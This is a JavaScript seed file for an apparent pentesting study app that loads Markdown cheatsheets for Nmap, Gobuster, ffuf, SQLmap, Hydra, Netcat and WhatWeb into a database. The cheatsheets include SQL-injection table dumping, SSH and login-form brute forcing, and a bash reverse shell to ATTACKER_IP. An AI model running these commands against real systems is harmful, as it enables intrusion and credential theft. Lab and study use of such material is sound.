import connectToDatabase from './mongodb';
import Tool from './models/Tool';

const TOOLS = [
  {
    name: 'Nmap',
    slug: 'nmap',
    category: 'recon',
    description: 'Network exploration tool and security/port scanner. The standard for network reconnaissance.',
    officialUrl: 'https://nmap.org',
    cheatsheet: `**Basic Syntax:** nmap [options] [target]

**Common Flags:**
- \`-sV\` — Detect service/version info
- \`-sC\` — Run default NSE scripts  
- \`-p-\` — Scan all 65535 ports
- \`-A\` — Aggressive (OS detect, version, scripts, traceroute)
- \`-T4\` — Faster scan timing

**Basic Service Scan:**
\`\`\`bash
nmap -sV -sC -p- -T4 10.10.10.121 -oN scan.txt
\`\`\`

**Quick Top Ports:**
\`\`\`bash
nmap -sV --top-ports 1000 10.10.10.121
\`\`\`

**NSE Script Examples:**
\`\`\`bash
nmap --script=vuln 10.10.10.121
nmap --script=http-enum 10.10.10.121
\`\`\``,
  },
  {
    name: 'Gobuster',
    slug: 'gobuster',
    category: 'web',
    description: 'Tool used to brute-force URIs (directories and files) in web sites and DNS subdomains.',
    officialUrl: 'https://github.com/OJ/gobuster',
    cheatsheet: `**Common Modes:** dir, dns, vhost

**Directory Scan:**
\`\`\`bash
wsl gobuster dir -u http://10.10.10.121/ -w "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Discovery/Web-Content/common.txt"
\`\`\`

**With file extensions:**
\`\`\`bash
wsl gobuster dir -u http://10.10.10.121/ -w "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt" -x php,html,txt -t 50
\`\`\`

**DNS Subdomain:**
\`\`\`bash
wsl gobuster dns -d target.com -w "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt"
\`\`\``,
  },
  {
    name: 'ffuf',
    slug: 'ffuf',
    category: 'web',
    description: 'Fast web fuzzer written in Go. Used for directory discovery and parameter/header fuzzing.',
    officialUrl: 'https://github.com/ffuf/ffuf',
    cheatsheet: `**Core Concept:** Replace target with FUZZ keyword

**Directory Fuzzing:**
\`\`\`bash
wsl ffuf -u http://10.10.10.121/FUZZ -w "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Discovery/Web-Content/common.txt"
\`\`\`

**Subdomain Fuzzing:**
\`\`\`bash
wsl ffuf -u http://FUZZ.target.com -w "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt"
\`\`\`

**Key Flags:** -u, -w, -mc, -fc, -fs, -t, -o`,
  },
  {
    name: 'SQLmap',
    slug: 'sqlmap',
    category: 'exploitation',
    description: 'Automatic SQL injection and database takeover tool.',
    officialUrl: 'https://sqlmap.org',
    cheatsheet: `**Basic Detection:**
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
\`\`\`

**From Burp Request:**
\`\`\`bash
sqlmap -r request.txt --dbs
\`\`\`

**Dump Table:**
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" -D db_name -T users --dump
\`\`\``,
  },
  {
    name: 'Hydra',
    slug: 'hydra',
    category: 'passwords',
    description: 'Fast and flexible online password cracking tool supporting numerous protocols.',
    officialUrl: 'https://github.com/vanhauser-thc/thc-hydra',
    cheatsheet: `**SSH Brute Force:**
\`\`\`bash
wsl hydra -l admin -P "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt" ssh://10.10.10.121
\`\`\`

**HTTP Form:**
\`\`\`bash
wsl hydra -l admin -P "/mnt/c/Users/pgayu/Downloads/hack-the-box/SecLists-master/Passwords/Common-Credentials/top-passwords-shortlist.txt" 10.10.10.121 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
\`\`\``,
  },
  {
    name: 'Netcat',
    slug: 'netcat',
    category: 'post-exploitation',
    description: "The 'Swiss Army knife' of networking. Used for reverse shells, port scans, file transfers.",
    officialUrl: 'https://nmap.org/ncat',
    cheatsheet: `**Listen for Reverse Shell:**
\`\`\`bash
nc -lvnp 4444
\`\`\`

**Reverse Shell (on victim):**
\`\`\`bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
\`\`\`

**File Transfer:**
\`\`\`bash
# Receiver
nc -lvnp 9999 > received_file
# Sender
nc TARGET_IP 9999 < file_to_send
\`\`\``,
  },
  {
    name: 'Whatweb',
    slug: 'whatweb',
    category: 'recon',
    description: 'Identifies technologies used on websites including CMS, JS frameworks, and server info.',
    officialUrl: 'https://github.com/urbanadventurer/WhatWeb',
    cheatsheet: `**Single Target:**
\`\`\`bash
whatweb 10.10.10.121
\`\`\`

**Verbose:**
\`\`\`bash
whatweb -v http://10.10.10.121
\`\`\`

**Aggressive detection:**
\`\`\`bash
whatweb -a 3 http://10.10.10.121
\`\`\``,
  },
];

export async function seedTools() {
  await connectToDatabase();
  let seeded = 0;
  let updated = 0;
  for (const tool of TOOLS) {
    const existing = await Tool.findOne({ slug: tool.slug });
    if (!existing) {
      await Tool.create(tool);
      seeded++;
    } else if (
      ['gobuster', 'ffuf', 'hydra'].includes(tool.slug) &&
      (
        existing.cheatsheet.includes('/usr/share/') ||
        /(?:-w\s+)(?:common\.txt|subdomains-top1million-5000\.txt)\b/.test(existing.cheatsheet) ||
        /(?:-P\s+)rockyou\.txt\b/.test(existing.cheatsheet)
      )
    ) {
      // Refresh only the seeded tools whose wordlist examples were known to be stale.
      // User-created tools and already-correct records are left untouched.
      await Tool.updateOne({ _id: existing._id }, { $set: { cheatsheet: tool.cheatsheet } });
      updated++;
    }
  }
  return seeded + updated;
}
